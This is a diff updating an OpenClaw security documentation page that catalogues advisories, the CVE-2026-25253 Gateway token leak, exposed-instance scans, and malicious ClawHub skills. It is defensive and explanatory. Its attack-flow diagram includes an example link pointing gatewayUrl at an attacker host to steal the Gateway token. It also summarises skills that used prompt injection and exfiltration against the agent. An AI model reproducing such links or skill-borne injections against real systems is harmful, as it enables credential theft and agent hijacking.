@@ -1,18 +1,138 @@
 ---
 last_update:
-  date: 2026-07-08
+  date: 2026-10-18
+verified_with: 2026.10.4
 title: Known Vulnerabilities
-description: CVEs, security incidents, advisories, and the full security timeline for OpenClaw — from one-click RCE to 135,000 exposed instances
-keywords: [openclaw, openclaw cve, openclaw vulnerability, security issues, cve-2026-25253, security advisory, remote code execution]
+description: OpenClaw security advisories by severity and month, every critical advisory, the June and September 2026 batches, and the early-2026 incidents — with the minimum version to run
+keywords: [openclaw, openclaw cve, openclaw vulnerability, security advisory, ghsa, cve-2026-25253, clawhavoc, minimum safe version]
 ---
 
 # Known Vulnerabilities
 
-A comprehensive record of OpenClaw security incidents and vulnerabilities. OpenClaw's explosive adoption massively outpaced its security maturity, resulting in an unprecedented cascade of security events in January-February 2026.
+A readable record of OpenClaw's published security advisories and the major incidents around it. Advisory numbers are as of 2026-10-18 and come from `gh api repos/openclaw/openclaw/security-advisories --paginate`. To regenerate them, run `node scripts/advisories.mjs` in this site's repository.
 
-:::danger
-**Gartner has recommended enterprises "block OpenClaw downloads and traffic immediately."** JFrog found 93.4% of publicly reachable instances had critical authentication bypasses. Noma Security reported 53% of enterprise customers gave OpenClaw privileged access over a single weekend. Take security seriously.
+:::danger Minimum safe version: the latest stable release
+As of 2026-10-18 the latest stable release is **v2026.10.4** (published 2026-10-16). Always run the latest stable release, and update plugins with it:
+
+```bash
+openclaw update
+openclaw plugins update --all
+openclaw --version
+```
+
+There is no older "safe" version to pin. The most recent advisories (2026-09-11) have fixes up to **2026.9.2** in core and **2026.9.3** in the `@openclaw/discord` and `@openclaw/diagnostics-prometheus` plugins. Many fixes ship only in separate `@openclaw/*` channel plugins, so updating core alone is not enough.
+
+Advisories list **stable** patched versions. The extended-stable channel uses monthly patch numbers of 33 and higher ([release channels](https://docs.openclaw.ai/install/development-channels)), which don't compare directly. If you run extended-stable, check the release notes, or switch to stable.
 :::
+
+---
+
+## Advisories at a glance
+
+**722** published repository advisories as of 2026-10-18 ([openclaw/openclaw security advisories](https://github.com/openclaw/openclaw/security/advisories)). 39 of them have a CVE ID.
+
+| Severity | Count |
+|---|---|
+| Critical | 14 |
+| High | 249 |
+| Medium | 390 |
+| Low | 69 |
+
+| Month published | Critical | High | Medium | Low | Total |
+|---|---|---|---|---|---|
+| 2026-01 | 0 | 3 | 0 | 0 | 3 |
+| 2026-02 | 3 | 61 | 128 | 28 | 220 |
+| 2026-03 | 10 | 70 | 107 | 17 | 204 |
+| 2026-04 | 1 | 39 | 53 | 15 | 108 |
+| 2026-05 | 0 | 13 | 50 | 4 | 67 |
+| 2026-06 | 0 | 33 | 12 | 0 | 45 |
+| 2026-07 | 0 | 0 | 0 | 0 | 0 |
+| 2026-08 | 0 | 0 | 0 | 0 | 0 |
+| 2026-09 | 0 | 30 | 40 | 5 | 75 |
+| 2026-10 (to the 18th) | 0 | 0 | 0 | 0 | 0 |
+
+The June and September advisories were each published on one day (2026-06-30 and 2026-09-11) as coordinated disclosures of issues already fixed in released versions.
+
+**CVSS labels.** Under CVSS 3.1 and 4.0, 9.0–10.0 is **Critical**, 7.0–8.9 **High**, 4.0–6.9 **Medium** and 0.1–3.9 **Low** ([FIRST CVSS v3.1 specification](https://www.first.org/cvss/v3.1/specification-document#Qualitative-Severity-Rating-Scale)). A score of 8.8, such as CVE-2026-25253, is **High**, not Critical.
+
+## Critical advisories {#critical-advisories}
+
+All 14 critical-severity advisories. None has a CVE ID. Four were published without a numeric score; their severity is GitHub's label.
+
+| Published | Advisory | CVSS | Summary | Fixed in |
+|---|---|---|---|---|
+| 2026-02-14 | [GHSA-gv46-4xfq-jv58](https://github.com/openclaw/openclaw/security/advisories/GHSA-gv46-4xfq-jv58) | 9.9 | Remote code execution via node invoke approval bypass in the Gateway | 2026.2.14 |
+| 2026-02-14 | [GHSA-4rj2-gpmh-qq5x](https://github.com/openclaw/openclaw/security/advisories/GHSA-4rj2-gpmh-qq5x) | 9.4 | Voice-call inbound allowlist bypass (empty caller ID plus suffix matching) | 2026.2.2 |
+| 2026-02-14 | [GHSA-qrq5-wjgg-rvqw](https://github.com/openclaw/openclaw/security/advisories/GHSA-qrq5-wjgg-rvqw) | 9.3 | Path traversal in plugin installation | 2026.2.1 |
+| 2026-03-12 | [GHSA-4jpw-hj22-2xmc](https://github.com/openclaw/openclaw/security/advisories/GHSA-4jpw-hj22-2xmc) | 9.9 | Pairing-scoped device tokens could mint `operator.admin` and reach node RCE | 2026.3.11 |
+| 2026-03-13 | [GHSA-rqpp-rjj8-7wv8](https://github.com/openclaw/openclaw/security/advisories/GHSA-rqpp-rjj8-7wv8) | 9.9 | WebSocket shared-auth connections could self-declare elevated scopes | 2026.3.12 |
+| 2026-03-24 | [GHSA-hf68-49fm-59cq](https://github.com/openclaw/openclaw/security/advisories/GHSA-hf68-49fm-59cq) | not scored | `device.pair.approve` let `operator.pairing` escalate a new device to `operator.admin` | 2026.3.22 |
+| 2026-03-26 | [GHSA-9hjh-fr4f-gxc4](https://github.com/openclaw/openclaw/security/advisories/GHSA-9hjh-fr4f-gxc4) | not scored | Backend reconnect let non-admin operator scopes self-claim `operator.admin` | 2026.3.25 |
+| 2026-03-26 | [GHSA-fqw4-mph7-2vr8](https://github.com/openclaw/openclaw/security/advisories/GHSA-fqw4-mph7-2vr8) | not scored | Local shared-auth reconnect widened a paired device from `operator.read` to `operator.admin` | 2026.3.25 |
+| 2026-03-29 | [GHSA-hc5h-pmr3-3497](https://github.com/openclaw/openclaw/security/advisories/GHSA-hc5h-pmr3-3497) | 9.4 (CVSS 4.0) | `/pair approve` omitted caller scope subsetting and reopened pairing escalation | 2026.3.28 |
+| 2026-03-29 | [GHSA-8rh7-6779-cjqq](https://github.com/openclaw/openclaw/security/advisories/GHSA-8rh7-6779-cjqq) | 9.6 | A `.env` in the working directory could inject variables and take over config | 2026.3.28 |
+| 2026-03-29 | [GHSA-j7p2-qcwm-94v4](https://github.com/openclaw/openclaw/security/advisories/GHSA-j7p2-qcwm-94v4) | 9.6 | Incomplete host-env blocklist allowed supply-chain redirection via package-manager variables | 2026.3.22 |
+| 2026-03-31 | [GHSA-9p3r-hh9g-5cmg](https://github.com/openclaw/openclaw/security/advisories/GHSA-9p3r-hh9g-5cmg) | 9.4 (CVSS 4.0) | Sandbox escape via a TOCTOU race in the remote FS bridge `readFile` | 2026.3.31 |
+| 2026-03-31 | [GHSA-g5cg-8x5w-7jpm](https://github.com/openclaw/openclaw/security/advisories/GHSA-g5cg-8x5w-7jpm) | 9.5 (CVSS 4.0) | Heartbeat context inheritance bypassed the sandbox via `senderIsOwner` escalation | 2026.3.31 |
+| 2026-04-16 | [GHSA-xh72-v6v9-mwhc](https://github.com/openclaw/openclaw/security/advisories/GHSA-xh72-v6v9-mwhc) | not scored | Feishu webhook and card-action validation did not fail closed | 2026.4.15 |
+
+Scores are CVSS 3.1 unless marked. Also notable from February: [GHSA-g6q9-8fvw-f7rf](https://github.com/openclaw/openclaw/security/advisories/GHSA-g6q9-8fvw-f7rf) (CVE-2026-26322, High), a second `gatewayUrl` override issue in the Gateway tool, fixed in 2026.2.14.
+
+---
+
+## September 2026 advisory batch (September 11, 2026) {#september-2026-advisory-batch}
+
+On 2026-09-11 the project published **75 advisories**: 30 High, 40 Medium and 5 Low, none Critical. All were already fixed in releases from **2026.7.1 to 2026.9.3**. Many fixes are in channel plugins (`@openclaw/slack`, `discord`, `whatsapp`, `matrix`, `msteams`, `feishu`, `googlechat`, `line`, `voice-call`), and three are in the iOS app.
+
+The High advisories scored 8.0 or more:
+
+| Advisory | CVSS | Summary | Fixed in |
+|---|---|---|---|
+| [GHSA-wwx7-573h-pqwc](https://github.com/openclaw/openclaw/security/advisories/GHSA-wwx7-573h-pqwc) | 8.8 | MCP configuration changes could omit owner authorization | 2026.7.1 |
+| [GHSA-8xxh-v4vc-qvm4](https://github.com/openclaw/openclaw/security/advisories/GHSA-8xxh-v4vc-qvm4) | 8.8 | Cron tool could accept mixed-case command payloads | 2026.7.1 |
+| [GHSA-9p6m-2872-xm7x](https://github.com/openclaw/openclaw/security/advisories/GHSA-9p6m-2872-xm7x) | 8.8 | Codex bind could omit owner authorization | 2026.7.1 |
+| [GHSA-pjjr-5qhr-5w6r](https://github.com/openclaw/openclaw/security/advisories/GHSA-pjjr-5qhr-5w6r) | 8.8 | Codex computer-use install could omit owner authorization | 2026.7.1 |
+| [GHSA-224w-vfr9-h35c](https://github.com/openclaw/openclaw/security/advisories/GHSA-224w-vfr9-h35c) | 8.8 | Google Meet node commands could skip exec approvals | 2026.7.1 |
+| [GHSA-wwcw-jfpp-gpxw](https://github.com/openclaw/openclaw/security/advisories/GHSA-wwcw-jfpp-gpxw) | 8.8 | Codex native tools could ignore per-chat policy | 2026.8.1 |
+| [GHSA-rrxp-5mx8-mvhh](https://github.com/openclaw/openclaw/security/advisories/GHSA-rrxp-5mx8-mvhh) | 8.8 | Inbound voice calls could inherit owner tool authority | `@openclaw/voice-call` 2026.8.1 |
+| [GHSA-58qx-6m8p-wh2j](https://github.com/openclaw/openclaw/security/advisories/GHSA-58qx-6m8p-wh2j) | 8.8 | Slack group DMs could skip sender allowlists | `@openclaw/slack` 2026.8.1 |
+| [GHSA-jjpc-p3xf-8g7p](https://github.com/openclaw/openclaw/security/advisories/GHSA-jjpc-p3xf-8g7p) | 8.3 | iOS Control UI did not enforce saved Gateway TLS pins | iOS 2026.8.11 |
+| [GHSA-jghr-xp78-995p](https://github.com/openclaw/openclaw/security/advisories/GHSA-jghr-xp78-995p) | 8.3 | Browser proxy could miss its admin scope | 2026.7.1 |
+| [GHSA-9x88-f7rh-4c83](https://github.com/openclaw/openclaw/security/advisories/GHSA-9x88-f7rh-4c83) | 8.3 | Browser node targets could bypass sandbox host control | 2026.7.1 |
+| [GHSA-7cp7-87pj-p32v](https://github.com/openclaw/openclaw/security/advisories/GHSA-7cp7-87pj-p32v) | 8.3 | Skill tool dispatch could skip owner-only policy | 2026.8.1 |
+| [GHSA-hpg5-cq3m-phqp](https://github.com/openclaw/openclaw/security/advisories/GHSA-hpg5-cq3m-phqp) | 8.3 | Agent cron tool could reach operator command jobs | 2026.8.1 |
+| [GHSA-p3h6-v2h4-36q2](https://github.com/openclaw/openclaw/security/advisories/GHSA-p3h6-v2h4-36q2) | 8.2 | Browser CDP connections could discard DNS pinning | 2026.8.1 |
+| [GHSA-9m4p-cqp4-jppq](https://github.com/openclaw/openclaw/security/advisories/GHSA-9m4p-cqp4-jppq) | 8.1 | WhatsApp login tool could reach non-owner turns | `@openclaw/whatsapp` 2026.8.1 |
+| [GHSA-p5g8-m35v-7m82](https://github.com/openclaw/openclaw/security/advisories/GHSA-p5g8-m35v-7m82) | 8.0 | Claude permission replies could omit owner authorization | 2026.7.1 |
+| [GHSA-ghpx-6xwq-2w4w](https://github.com/openclaw/openclaw/security/advisories/GHSA-ghpx-6xwq-2w4w) | 8.0 | Exec wrapper allowlists could trust arbitrary inner commands | 2026.8.1 |
+| [GHSA-9f86-pvv5-rxfw](https://github.com/openclaw/openclaw/security/advisories/GHSA-9f86-pvv5-rxfw) | 8.0 | Escaped newlines could confuse exec allowlist parsing | 2026.8.1 |
+
+Several of these weaken exec allowlists and approvals, which is one reason upstream calls approvals guardrails rather than a sandbox. See [exec approvals and sandboxing](/security/hardening#exec-approvals).
+
+---
+
+## June 2026 Advisory Batch (June 30, 2026)
+
+On 2026-06-30 the project published **45 advisories**: 33 High and 12 Medium. They were a coordinated disclosure of issues already fixed between **v2026.5.12 and v2026.6.9**. Ten of them, including GHSA-7vrr-rp4x-4g76, were fixed only in **v2026.6.9** (released 2026-06-21). Version 2026.6.8 was **not** enough.
+
+### Notable advisories
+
+| Advisory | Issue | CVSS | Affected | Fixed in |
+|----------|-------|------|----------|----------|
+| [GHSA-7vrr-rp4x-4g76](https://github.com/openclaw/openclaw/security/advisories/GHSA-7vrr-rp4x-4g76) | Plugin install commands could allow non-owner persistence | 8.8 (High) | ≥ 2026.5.20, < 2026.6.9 | 2026.6.9 |
+| [GHSA-3fp5-v549-9v66](https://github.com/openclaw/openclaw/security/advisories/GHSA-3fp5-v549-9v66) | `flock` wrapper could bypass durable exec approval binding | 8.8 (High) | see advisory | 2026.6.9 |
+| [GHSA-mm9g-83wh-mhwj](https://github.com/openclaw/openclaw/security/advisories/GHSA-mm9g-83wh-mhwj) | Isolated cron jobs could regain denied exec tools | 8.8 (High) | see advisory | 2026.6.9 |
+| [GHSA-52xj-c9p8-78cv](https://github.com/openclaw/openclaw/security/advisories/GHSA-52xj-c9p8-78cv) | MCP loopback could expose owner-only tools to non-owner runs | 8.3 (High) | ≥ 2026.5.20, < 2026.6.6 | 2026.6.6 |
+| [GHSA-jhfx-v2j8-x3m6](https://github.com/openclaw/openclaw/security/advisories/GHSA-jhfx-v2j8-x3m6) | OpenAI-compatible HTTP model overrides could miss admin authorization | 7.6 (High) | ≤ 2026.6.6 | 2026.6.8 |
+| [GHSA-wgq8-x5wm-g4rw](https://github.com/openclaw/openclaw/security/advisories/GHSA-wgq8-x5wm-g4rw) | Plugin install wrappers could skip install policy | 4.9 (Medium) | ≥ 2026.6.5, < 2026.6.9 | 2026.6.9 |
+
+### v2026.6.11 security hardening
+
+The v2026.6.11 release (June 30, 2026) added further fixes (`CHANGELOG/2026.6.11.md` upstream):
+
+- **Control UI DOMPurify update** ([GHSA-cmwh-pvxp-8882](https://github.com/advisories/GHSA-cmwh-pvxp-8882), CVE-2026-65898, a DOMPurify advisory in GitHub's global database). The bundled sanitizer moved to a patched DOMPurify release (PR #95691).
+- **Lookalike package-source rejection.** Trusted package sources now reject lookalike sibling paths. For example, trusting `/artifactory/openclaw` no longer admits `/artifactory/openclaw-malicious`.
+- **ClawHub client DoS hardening.** Oversized or stalled marketplace responses are cut off before they exhaust memory (PR #95226).
 
 ---
 
@@ -20,128 +140,58 @@ A comprehensive record of OpenClaw security incidents and vulnerabilities. OpenC
 
 | Field | Value |
 |-------|-------|
-| **CVE** | CVE-2026-25253 |
-| **CVSS** | 8.8 (Critical) |
-| **CWE** | CWE-669: Incorrect Resource Transfer Between Spheres |
-| **Affected Versions** | All versions before v2026.1.29 |
-| **Fixed In** | v2026.1.29 (January 30, 2026) |
-| **Discoverer** | Mav Levin (depthfirst.com) |
+| **CVE** | [CVE-2026-25253](https://nvd.nist.gov/vuln/detail/CVE-2026-25253) |
+| **GHSA** | [GHSA-g8p2-7wf7-98mq](https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq) |
+| **CVSS** | 8.8 (**High**, CVSS 3.1) |
+| **CWE** | CWE-669 (NVD); GitHub's advisory lists CWE-200 |
+| **Affected** | package `clawdbot` ≤ 2026.1.28 |
+| **Fixed in** | v2026.1.29 (released 2026-01-30); advisory published 2026-01-31 |
+| **Credits** | DepthFirstDisclosures, Mav Levin (depthfirst), 0xacb |
 
 ### Description
 
-The OpenClaw Gateway Control UI accepted a `gatewayUrl` parameter from query strings without validation. The UI automatically established a WebSocket connection without user confirmation, transmitting authentication credentials. The server also failed to validate WebSocket origin headers, enabling cross-site WebSocket hijacking.
+The Control UI trusted a `gatewayUrl` value from the query string and connected to it automatically on load, sending the stored Gateway token in the WebSocket connect payload. An attacker who got a victim to open a crafted link received the token, could then connect to the victim's Gateway, change sandbox and tool policy, and run privileged actions. The fix makes users confirm a new Gateway URL in the UI ([advisory](https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq)).
 
-### Attack Flow
+### Attack flow
 
 ```mermaid
 flowchart TD
-    A["1. Attacker crafts URL<br/>localhost:18789/ui?gatewayUrl=ws://evil.com"] --> B["2. Victim clicks link<br/>(phishing, chat, etc.)"]
-    B --> C["3. Browser opens Control UI"]
-    C --> D["4. UI connects to attacker's<br/>WebSocket, sends auth token"]
-    D --> E["5. Attacker disables confirmations<br/>(exec.approvals.set = off)"]
-    E --> F["6. Attacker escapes containers<br/>(tools.exec.host = gateway)"]
-    F --> G["7. Full system compromise<br/>in milliseconds"]
+    A["1. Attacker crafts a Control UI link<br/>with ?gatewayUrl=wss://attacker.example"] --> B["2. Victim opens the link<br/>(phishing, chat, etc.)"]
+    B --> C["3. Control UI connects to the<br/>attacker's WebSocket and sends the token"]
+    C --> D["4. Attacker connects to the victim's<br/>Gateway with the stolen token"]
+    D --> E["5. Attacker turns off approvals<br/>and runs commands on the host"]
 
     style A fill:#ff6b6b,color:#fff
-    style G fill:#ff6b6b,color:#fff
+    style E fill:#ff6b6b,color:#fff
 ```
 
-Even **localhost-only instances** were vulnerable — the exploit used the victim's browser as a pivot into the local network.
+Even loopback-only instances were exposed, because the victim's own browser made the connection.
 
-### Additional CVE: CVE-2026-25157
+### Related: CVE-2026-25157
 
-A high-severity OS command injection vulnerability in the OpenClaw/Clawdbot macOS application's SSH handling, where improperly escaped inputs could allow attackers to execute arbitrary commands on the local or remote host.
+[GHSA-q284-4pvr-m585](https://github.com/openclaw/openclaw/security/advisories/GHSA-q284-4pvr-m585) (CVE-2026-25157, CVSS 7.7 High): OS command injection through the project root path in the macOS app's `sshNodeCommand`. Fixed in v2026.1.29.
 
-### Advisories Issued By
+### Advisories issued by others
 
-- [Belgian CCB (Safeonweb)](https://ccb.belgium.be/advisories/warning-critical-vulnerability-openclaw-allows-1-click-remote-code-execution-when) — Official advisory urging immediate patching
-- [University of Toronto](https://security.utoronto.ca/advisories/openclaw-vulnerability-notification/) — Vulnerability notification
-- [SOCRadar](https://socradar.io/blog/cve-2026-25253-rce-openclaw-auth-token/) — Technical analysis
-- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-25253) — NIST National Vulnerability Database entry
-
-### Mitigation
-
-```bash
-# Update immediately
-npm update -g openclaw
-
-# Verify you're on v2026.1.29 or later
-openclaw --version
-```
+- [Belgian CCB (Safeonweb)](https://ccb.belgium.be/advisories/warning-critical-vulnerability-openclaw-allows-1-click-remote-code-execution-when): advisory urging immediate patching (the page blocks automated checks; not re-verified on 2026-10-18)
+- [University of Toronto](https://security.utoronto.ca/advisories/openclaw-vulnerability-notification/): vulnerability notification
+- [SOCRadar](https://socradar.io/blog/cve-2026-25253-rce-openclaw-auth-token/): technical analysis
 
 ---
 
-## June 2026 Advisory Batch (June 30, 2026)
+## Gateway authentication bypass (JFrog, February 2026)
 
-On June 30, 2026, the OpenClaw project batch-published **~45 GitHub security advisories** (roughly 33 High and 12 Moderate severity). This was a coordinated disclosure of issues that had already been patched in the v2026.6.6–v2026.6.8 releases earlier in June — not a wave of new zero-days. If you are on **v2026.6.8 or later**, you are covered.
+JFrog's "[Giving OpenClaw the Keys to Your Kingdom](https://jfrog.com/blog/giving-openclaw-the-keys-to-your-kingdom-read-this-first/)" reported that **93.4% of publicly reachable instances** it examined had critical authentication bypasses.
 
-### Notable Advisories
+**The historical mechanism.** Older Gateways trusted connections from `127.0.0.1`. Behind a same-host reverse proxy every request arrived from localhost, so the Gateway treated it as local. This was fixed by [PR #1795](https://github.com/openclaw/openclaw/pull/1795), "prevent auth bypass when behind unconfigured reverse proxy", merged 2026-01-25.
 
-| Advisory | Issue | CVSS | Affected | Fixed In |
-|----------|-------|------|----------|----------|
-| [GHSA-7vrr-rp4x-4g76](https://github.com/openclaw/openclaw/security/advisories/GHSA-7vrr-rp4x-4g76) | Plugin install commands could allow non-owner persistence | 8.8 (High) | — | v2026.6.6–6.8 window |
-| [GHSA-52xj-c9p8-78cv](https://github.com/openclaw/openclaw/security/advisories/GHSA-52xj-c9p8-78cv) | MCP loopback could expose owner-only tools to non-owner runs | 8.3 (High) | v2026.5.20 – < v2026.6.6 | v2026.6.6 |
-| [GHSA-jhfx-v2j8-x3m6](https://github.com/openclaw/openclaw/security/advisories/GHSA-jhfx-v2j8-x3m6) | OpenAI-compatible HTTP model overrides could miss admin authorization | 7.6 (High) | ≤ v2026.6.6 | v2026.6.8 |
-| [GHSA-wgq8-x5wm-g4rw](https://github.com/openclaw/openclaw/security/advisories/GHSA-wgq8-x5wm-g4rw) | Plugin install wrappers could skip install policy | Moderate | — | v2026.6.6–6.8 window |
-
-The full batch covers MCP loopback privilege exposure, plugin-install persistence and policy bypasses, and missing admin authorization on model overrides. Browse the complete list at [github.com/openclaw/openclaw/security/advisories](https://github.com/openclaw/openclaw/security/advisories).
-
-### v2026.6.11 Security Hardening
-
-The v2026.6.11 release (June 30, 2026) added further security fixes:
-
-- **Control UI DOMPurify update** ([GHSA-cmwh-pvxp-8882](https://github.com/advisories/GHSA-cmwh-pvxp-8882)) — the bundled sanitizer was updated to a patched DOMPurify release, mitigating `ALLOWED_ATTR` pollution via `setConfig()` (PR #95691)
-- **Lookalike package-source rejection** — trusted OpenClaw package sources now reject lookalike sibling paths (e.g., trusting `/artifactory/openclaw` no longer admits `/artifactory/openclaw-malicious`)
-- **ClawHub client DoS hardening** — oversized or stalled marketplace responses during skill discovery and install checks are now terminated before exhausting memory (PR #95226)
-
-### Mitigation
-
-```bash
-# Upgrade to v2026.6.8 or later (ideally the latest stable)
-npm update -g openclaw
-openclaw --version
-```
-
----
-
-## Gateway Authentication Bypass (JFrog)
-
-JFrog published "[Giving OpenClaw the Keys to Your Kingdom](https://jfrog.com/blog/giving-openclaw-the-keys-to-your-kingdom-read-this-first/)" revealing that **93.4% of publicly reachable OpenClaw instances had critical authentication bypass vulnerabilities**.
-
-### The Bypass Mechanism
-
-OpenClaw's gateway auto-approves connections from `127.0.0.1`. When deployed behind a reverse proxy (Nginx, Caddy, Traefik), **all external requests are forwarded to localhost**. The gateway sees every connection as local and bypasses authentication entirely.
-
-### Impact
-
-An attacker who reaches an exposed instance can:
-- Read files from the filesystem
-- Access emails and WhatsApp conversations
-- Extract API keys
-- Read Slack threads
-- Trigger additional agent actions
-- Execute arbitrary commands
-
-### Fix
-
-The fix was implemented in [PR #1795](https://github.com/openclaw/openclaw/pull/1795). Configure `trustedProxies` when behind a reverse proxy:
-
-```json title="~/.openclaw/openclaw.json"
-{
-  "gateway": {
-    "bind": "loopback",
-    "trustedProxies": ["127.0.0.1"]
-  }
-}
-```
-
-See [Security Hardening: trustedProxies](/security/hardening#configure-trustedproxies-critical-for-reverse-proxies) for full details.
+**Current behaviour.** Forwarded headers on a loopback request disqualify it from local trust. With token or password auth, an unconfigured same-host proxy gets `403 proxy_attribution_required`. A proxy only counts as trusted when listed in `gateway.trustedProxies` ([network exposure](https://docs.openclaw.ai/gateway/security/network-exposure)). Setup: [Security Hardening: reverse proxies](/security/hardening#configure-trustedproxies-critical-for-reverse-proxies).
 
 ---
 
 ## Exposed Instances (January-February 2026)
 
-Multiple security firms independently discovered a staggering number of exposed OpenClaw instances:
+Several firms counted OpenClaw instances reachable from the internet. These are third-party figures from early 2026, not current numbers:
 
 | Firm | Date | Count | Method |
 |------|------|-------|--------|
@@ -150,56 +200,26 @@ Multiple security firms independently discovered a staggering number of exposed 
 | **Shodan** | Feb 9 | 42,665 | Service fingerprinting |
 | **Follow-up scans** | Feb 9 | 135,000+ | Expanded detection |
 
-### Geographic Distribution
+[Terrace Networks reported](https://www.terracenetworks.com/blog/2026-02-09-openclaw-exploitation) that exploitation scanning started within hours of public announcements.
 
-| Region | Percentage | Notes |
-|--------|-----------|-------|
-| China | Largest concentration | 30%+ on Alibaba Cloud |
-| United States | Second | Major cloud providers |
-| Singapore | Third | AWS/GCP Asia |
-| 82 countries total | 42,900 unique IPs | Global exposure |
+**Root cause.** Not a `0.0.0.0` default on host installs: `auto` bind has been loopback-first since v2026.1.21 (`CHANGELOG/2026.1.21.md` upstream). The exposure came from deployments that chose a LAN or public bind, published Docker ports on every interface (the Docker setup still defaults to `lan` bind, see [Docker](/security/hardening#docker)), or put a public reverse proxy in front.
 
-### Key Finding
+### Check whether you are exposed
 
-Of the 42,665 instances found on Shodan:
-- 23,505 showed active control panel interfaces
-- **15,200 were vulnerable to remote code execution**
-- Three CVEs had public exploit code
-
-### Detection Method
-
-SecurityScorecard used **favicon fingerprinting** of exposed gateway web UIs. Censys tracked rapid growth from ~1,000 to 21,000+ instances in under a week.
-
-### Active Exploitation
-
-[Terrace Networks reported](https://www.terracenetworks.com/blog/2026-02-09-openclaw-exploitation) that the window between tool announcement and active exploitation was measured in **hours, not weeks**. Exploitation scanning ramped up globally in lockstep with public announcements.
-
-### Root Cause
-
-The default configuration bound the gateway to `0.0.0.0` (all interfaces) rather than `127.0.0.1`:
-
-```yaml
-# DANGEROUS — the old default
-gateway:
-  host: "0.0.0.0"  # Exposes to the entire internet
-
-# CORRECT — current recommended default
-gateway:
-  host: "127.0.0.1"  # Localhost only
-```
-
-### Check If You're Exposed
+Scan from a machine **outside** your network. Checking from the host itself only tests the bind:
 
 ```bash
-# From another machine on your network
-curl http://YOUR_IP:18789
+nmap -sT -p 18789 <public-ip>
+```
 
-# If you get a response, you're exposed. Fix immediately:
-openclaw config set gateway.host "127.0.0.1"
+If the port is open, fix it:
+
+```bash
+openclaw config set gateway.bind loopback
 openclaw gateway restart
 ```
 
-External check: [Have I Been Clawned?](https://haveibeenclawned.com/) provides a free external security audit.
+Docker: change the published port to `127.0.0.1:18789:18789` and add `DOCKER-USER` rules ([firewall](/security/hardening#firewall)). Then rotate the Gateway token, because it may have been seen ([incident response](/security/hardening#incident-response)).
 
 ---
 
@@ -207,93 +227,56 @@ External check: [Have I Been Clawned?](https://haveibeenclawned.com/) provides a
 
 ### The ClawHavoc Campaign
 
-**Koi Security** researcher Oren Yomtov (assisted by "Alex," an OpenClaw bot configured for threat analysis) audited all 2,857 skills on ClawHub and found **341 malicious skills** across multiple coordinated campaigns:
+**Koi Security** researcher Oren Yomtov audited the 2,857 skills then on ClawHub and found **341 malicious skills** across several coordinated campaigns ([Koi Security](https://koisecurity.com/clawdex)):
 
-- **335 skills** installed **Atomic Stealer (AMOS)** macOS malware via fake `pre_install` hooks
-- All masqueraded as cryptocurrency trading automation, YouTube utilities, or auto-updaters
-- Campaign window: **January 27-29, 2026** (72 hours)
-- Stolen data: crypto exchange API keys, wallet private keys, SSH credentials, browser passwords
+- **335 skills** delivered **Atomic Stealer (AMOS)** macOS malware through "Prerequisites" sections that told users to download a password-protected ZIP or run an obfuscated script
+- They posed as crypto trading automation, YouTube utilities or auto-updaters
+- Campaign window: **January 27–29, 2026**
+- Targets: exchange API keys, wallet keys, SSH credentials, browser passwords
 
-**AMOS capabilities**: Exfiltrates Keychain passwords, system information, desktop/documents files, macOS user passwords, browser cookies/credentials, and cryptocurrency wallets (Electrum, Binance, Exodus, Atomic, Coinomi).
+### The "What Would Elon Do?" skill
 
-**Defense**: [Clawdex](https://koisecurity.com/clawdex) provides pre-installation scanning against Koi's malicious skills database.
+Cisco's AI Defense team found that ClawHub's most popular community skill at the time (its ranking had been gamed) had **9 vulnerabilities, 2 critical**, including silent data exfiltration and direct prompt injection. Cisco released an open-source [Skill Scanner](https://github.com/cisco-ai-defense/skill-scanner).
 
-### The "What Would Elon Do?" Skill
+### Snyk studies (February 5, 2026)
 
-Cisco's AI Defense team found that OpenClaw's **most popular community skill** (gamed to #1 ranking) contained **9 security vulnerabilities, 2 critical**:
-- Silently exfiltrated data to attacker-controlled servers
-- Used **direct prompt injection** to bypass the agent's safety guidelines
-- Confirmed data exfiltration and prompt injection **without user awareness**
+Snyk's ToxicSkills audit of **3,984 skills** from ClawHub and skills.sh found 1,467 (36%) with security flaws, 534 (13.4%) critical, and 76 confirmed malicious payloads. Snyk called it "the first documented supply-chain attack specifically targeting AI agent skills" ([SKILL.md to Shell Access in Three Lines of Markdown](https://snyk.io/articles/skill-md-shell-access/)). A separate Snyk audit found **283 skills (7.1%)** that pass API keys through the model context, where they end up in logs and transcripts. Snyk's scanner, formerly `mcp-scan`, is now [snyk/agent-scan](https://github.com/snyk/agent-scan).
 
-Cisco released an open-source [Skill Scanner](https://github.com/cisco-ai-defense/skill-scanner) combining static analysis, behavioral dataflow, LLM semantic analysis, and VirusTotal scanning.
+Bitdefender estimated that nearly 900 skills (about 20%) contained malicious content, the highest estimate published.
 
-### Snyk ToxicSkills Study (February 5)
+### What changed on ClawHub
 
-**Snyk** performed a broader audit of **3,984 skills** from ClawHub and skills.sh:
+As of 2026-10-18, per the [ClawHub repository](https://github.com/openclaw/clawhub):
 
-| Finding | Count | Percentage |
-|---------|-------|-----------|
-| Skills with security flaws | 1,467 | 36% |
-| Critical severity | 534 | 13.4% |
-| Confirmed malicious payloads | 76 | — |
-| Used hybrid attack (prompt injection + malware) | 91% of malicious | — |
+- Publishing a skill requires a GitHub account at least **14 days** old. At the time of ClawHavoc the requirement was one week ([security and moderation spec](https://github.com/openclaw/clawhub/blob/main/specs/security-moderation.md)).
+- Every release gets an **audit status** (`Pass`, `Review`, `Warn`, `Malicious`, `Pending`, `Error`) and a risk level, shown before install ([security audits](https://github.com/openclaw/clawhub/blob/main/docs/security-audits.md)). Scan sources include VirusTotal, ClawScan and static analysis, with SkillSpector and AIG reports where retained ([`openclaw skills`](https://docs.openclaw.ai/cli/skills)).
+- `openclaw skills verify @owner/<slug>` fetches that trust envelope. OpenClaw refuses malicious or blocked community releases at install time.
+- **Reports no longer auto-hide skills.** Earlier write-ups (including this page) said skills were hidden after 3 or 4 reports. The current spec says reports "never change skill visibility or installability automatically"; moderators review them.
+- OpenClaw's built-in code safety scanner (added in v2026.2.6) runs on installed skills as part of `openclaw security audit --deep`.
 
-Snyk called it *"the first documented supply-chain attack specifically targeting AI agent skills."*
-
-Key insight from Snyk's "[SKILL.md to Shell Access in Three Lines of Markdown](https://snyk.io/articles/skill-md-shell-access/)": The distinction between "documentation" and "executable instruction" doesn't exist for AI agents. Everything in a skill's Markdown is a potential command.
-
-### Snyk Credential Leaks Study
-
